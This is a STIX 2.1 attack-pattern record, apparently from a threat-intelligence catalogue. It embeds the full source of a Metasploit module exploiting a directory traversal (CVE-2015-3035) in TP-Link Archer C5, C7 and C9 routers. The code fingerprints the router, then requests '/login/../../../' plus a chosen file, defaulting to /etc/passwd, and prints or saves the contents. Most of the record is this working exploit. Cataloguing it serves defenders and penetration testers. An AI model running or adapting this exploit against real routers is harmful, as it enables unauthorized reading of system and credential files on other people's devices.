{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--36880808-df12-4562-8615-66fce049df14",
    "created": "2024-08-14T16:32:37.37217Z",
    "modified": "2024-08-14T16:32:37.372174Z",
    "name": "Archer C7 Directory Traversal Vulnerability",
    "description": " This module exploits a directory traversal vulnerability in the PATH_INFO found at /login/ on TP-Link Archer C5, C7, and C9 routers of varying versions.  'References' => [ [ 'BID', '74050 ' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/tplink_archer_c7_traversal.rb",
            "external_id": "tplink_archer_c7_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Deprecated\n  moved_from 'auxiliary/scanner/http/archer_c7_traversal'\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Archer C7 Directory Traversal Vulnerability',\n        'Description' => %q{\n          This module exploits a directory traversal vulnerability in the PATH_INFO found at /login/\n          on TP-Link Archer C5, C7, and C9 routers of varying versions.\n        },\n        'References' => [\n          [ 'BID', '74050 ' ],\n          [ 'CVE', '2015-3035' ]\n        ],\n        'Author' => [ 'Nick Cottrell <ncottrellweb[at]gmail.com>', 'Anna Graterol <annagraterol95[at]gmail.com>', 'Mana Mostaani <mana.mostaani[at]gmail.com>' ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2015-04-08',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n      )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('FILE', [true, 'The file to retrieve', '/etc/passwd']),\n        OptBool.new('SAVE', [false, 'Save the HTTP body', false]),\n      ]\n    )\n  end\n\n  def check\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri' => '/'\n    })\n    return Exploit::CheckCode::Unknown unless res\n\n    device_title = res.get_html_document&.at('//title')&.text\n    if device_title =~ /Archer C\\d/\n      return Exploit::CheckCode::Appears(\"Target device '#{device_title}'\")\n    end\n\n    Exploit::CheckCode::Safe('Target does not appear to be an Archer Cx router.')\n  end\n\n  def run\n    uri = normalize_uri('/login/../../../', datastore['FILE'])\n    print_status(\"Grabbing data at #{uri}\")\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri' => uri.to_s\n    })\n\n    fail_with(Failure::Unreachable, 'Connection failed') unless res\n\n    fail_with(Failure::NotFound, 'The file does not appear to exist') if res.body.to_s.include?('Error 404 requested page cannot be found')\n\n    # We don't save the body by default, because there's also other junk in it.\n    # But we still have a SAVE option just in case\n    print_good(\"#{datastore['FILE']} retrieved\")\n    print_line(res.body)\n\n    if datastore['SAVE']\n      p = store_loot(\n        'archer_c7.file',\n        'application/octet-stream',\n        rhost,\n        res.body,\n        ::File.basename(datastore['FILE'])\n      )\n      print_good(\"File saved as: #{p}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Nick Cottrell <ncottrellweb[at]gmail.com>",
        "Anna Graterol <annagraterol95[at]gmail.com>",
        "Mana Mostaani <mana.mostaani[at]gmail.com> ]",
        ""
    ],
    "x_mitre_disclosure_date": "2015-04-08"
}